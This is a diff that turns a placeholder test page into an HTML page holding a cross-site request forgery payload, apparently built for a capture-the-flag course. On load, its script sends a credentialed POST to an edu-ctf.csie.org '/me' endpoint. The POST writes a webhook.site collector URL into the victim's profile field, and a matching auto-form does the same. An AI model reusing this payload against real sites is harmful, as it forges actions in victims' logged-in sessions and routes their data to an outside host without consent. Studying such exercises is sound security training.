@@ -1,1 +1,26 @@
-<h1> test <h1>
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8" />
+  </head>
+  <body>
+    <form method="POST" action="https://edu-ctf.csie.org:44303/me" id="fm">
+      <input
+        type="text"
+        name="intro"
+        value="https://webhook.site/71200d7d-7a37-424f-ab0e-b73477efa52d"
+      />
+      <input type="submit" value="Submit" />
+    </form>
+    <script>
+      fetch("https://edu-ctf.csie.org:44303/me", {
+        method: "POST",
+        credentials: "include",
+        mode: "no-cors",
+        body: new URLSearchParams(
+          "intro=https://webhook.site/71200d7d-7a37-424f-ab0e-b73477efa52d"
+        ),
+      });
+    </script>
+  </body>
+</html>
